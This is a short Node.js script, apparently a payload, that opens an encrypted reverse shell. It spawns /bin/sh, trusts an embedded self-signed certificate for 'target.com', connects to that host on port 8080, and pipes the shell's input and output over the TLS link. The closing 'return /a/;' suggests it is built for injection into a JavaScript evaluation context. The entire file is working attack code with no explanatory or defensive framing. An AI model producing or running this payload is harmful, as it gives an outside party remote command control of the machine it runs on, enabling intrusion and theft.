var tls = require("tls"),
    cp = require("child_process"),
    sh = cp.spawn("/bin/sh", []);

const tlscfg = tls.createSecureContext();

tlscfg.context.addCACert(`-----BEGIN CERTIFICATE-----
MIIE0TCCArmgAwIBAgIUJgUkt3HC2BdrgUC7zx6duBq+s3UwDQYJKoZIhvcNAQEL
BQAwFTETMBEGA1UEAwwKdGFyZ2V0LmNvbTAeFw0xOTExMjMyMjAxMDNaFw0yOTA4
MjIyMjAxMDNaMBUxEzARBgNVBAMMCnRhcmdldC5jb20wggIiMA0GCSqGSIb3DQEB
AQUAA4ICDwAwggIKAoICAQCngT92+kVJoeBPQWTxrhNHO207C+/ccvzLfPLPj2ey
hOHGeE/C3ebNEUQ856gCpEh6ON/f1G6Wxgaz0p+8Du7AhmWc2H55RAt1ikivD/3L
AlAHQvtR7DOE9y5DK8H1X0xTUGicVQ0MI9mqFu5n/PL6x7lemN5NhiEVOpEw/J83
jfH8Jv/TZT6Wtsoi/kkVAxdlTMkM6rh04Ti25KHyBSOQEmRXLzdHZdb6iMJCkvpO
LV5vEr0IAhx+J1vruNJoFt+uWM/56IMWgjDeYozwLGey7QeKtcx4S4w3fBYKSeyR
ScxUx114B3Hi0+3jWnEyat80P2vriTMFngBzRnpPXFYOL12QfJfVIh9EYoanLMF0
cXitny457cFvRH0mGg/3BWIkSbUGYG2rsZninuvzG5jS9O76TdBDal4BpPrvJsgz
/o9Yek1jQfIyPJgPWrKoCXiJWqhF/CAQd9GLmwgwwRzzW582GJA2D07Nwr3EgCXI
dRsCimx4jJiXBVxAxHciPDR7W28VytcKTv6lcVU+VshLIpDklOaLNPlMzteKZX8e
WhxfzfjfefKVQugB33CBb9e2OSvtw7HDZcYR5fBH0Ndq825bwVzFJGGTP3cEbWsw
eIgtcQQeTubAwUEMajImjn8ahO5ixJHmFdbIRkBuPr0WSQSimfoLU28+DIsCcVql
dwIDAQABoxkwFzAVBgNVHREEDjAMggp0YXJnZXQuY29tMA0GCSqGSIb3DQEBCwUA
A4ICAQAqXsT2lqyoIk2PNPV9LGTqxeGRGDeVU0C9KVE48Ksg+BBrUiKBXuFhc4p2
KEhmYtdXZqXEZNaGIpNqXsneV7dHGKw0rysGQc34iS/kmFDdQAtlfuKOsBZNihtp
KToKkgoRXDW/1Pkx2TlleVVl8r2b/qJPpEIqMson7CpGVlxlV0XPgGijiVKgKuHt
qSZNMX8qbEDNET7MHJV+uV9ZaGGgkS6xA+7RbgPnoLBEaVIuU7CSs1r+JYFgx20w
K5LX2LalcQnE4q35DZamYefO0LZMo+iept4ywEdsFP1nGz/GKGxymWYjDehYM0Ym
ebkG2xzT58dL8hdMXG6W/ZEpXTwV7qYZ4ktYihVBW13FpA2b3x102meZuwZR+OSO
21tWB9NrYxWKK7Rlc1fu7ndaeOFctot1NliWpOWPaOC7lU1gZT62E1gDt21ICk9K
8nPo7vwyg2Zs5fCF7GTNbIotr2/xTmtVPeEUWMzy/3ca4z7rwLzH2xMs+UjLX6+6
YMUEco2bsQYvSE0NM+G7+iQg0zuLyVtwlv0qrGzdrfBQT0GEY78kb8M1HRwiSPUf
5tkgtEusA8O2L6+FesMF1018qUr5lVSlTghakks4NuSDSYFzYDH268vQvfOFbDD2
QwlkiFSnG5k5PG55Ur9tpBen56v6aL4rXbBUxSFioxGcYXCXtA==
-----END CERTIFICATE-----`);

var client = tls.connect(8080, "target.com", tlscfg, function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
